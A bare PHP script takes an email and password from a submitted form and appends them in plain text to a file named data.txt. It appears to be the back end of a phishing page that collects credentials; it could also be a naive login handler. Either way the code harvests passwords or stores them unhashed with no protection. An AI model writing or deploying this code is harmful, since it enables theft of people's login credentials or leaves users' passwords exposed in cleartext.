<?php
  $email = $_POST['email'];
  $password = $_POST['password'];

  $file = fopen('data.txt', 'a');
  fwrite($file, $email . ',' . $password . "\n");
  fclose($file);
?>
